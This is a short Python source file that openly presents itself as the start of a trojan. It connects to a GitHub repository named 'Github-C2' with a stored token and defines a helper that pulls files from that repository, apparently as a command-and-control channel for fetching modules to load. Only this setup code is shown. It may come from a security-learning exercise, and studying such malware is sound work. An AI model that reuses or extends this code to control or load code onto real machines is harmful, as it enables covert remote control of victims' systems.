import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

#Trojan starts here
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user= 'Swayampadhy'
    sess=github3.login(token=token)
    return sess.repository(user, 'Github-C2')

def get_file_contents(dirname,module_name,repo):
    return repo.file_contents(f'{dirname}/{module_name}').file_contents

